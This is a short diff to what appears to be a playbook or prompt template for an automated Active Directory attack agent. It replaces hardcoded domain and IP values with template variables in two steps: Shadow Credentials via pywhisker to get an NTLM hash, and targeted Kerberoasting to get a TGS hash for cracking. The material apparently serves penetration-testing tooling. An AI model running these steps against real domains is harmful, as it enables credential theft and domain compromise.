@@ -41,13 +41,13 @@ When you have these permissions on a user/computer:
 
 1. **Shadow Credentials** (BEST - one step to hash)
    ```
-   pywhisker(target_samaccountname="targetuser", domain="contoso.local", username="user", password="pass", dc_ip="192.168.58.10")
+   pywhisker(target_samaccountname="targetuser", domain="{{ target_domain }}", username="user", password="pass", dc_ip="{{ target_dc_ip }}")
    → Use generated PFX with certipy_auth (from PrivEsc) to get NTLM hash
    ```
 
 2. **Targeted Kerberoast**
    ```
-   targeted_kerberoast(target="targetuser", domain="contoso.local")
+   targeted_kerberoast(target="targetuser", domain="{{ target_domain }}")
    → Get TGS hash → Request crack from orchestrator
    ```
 
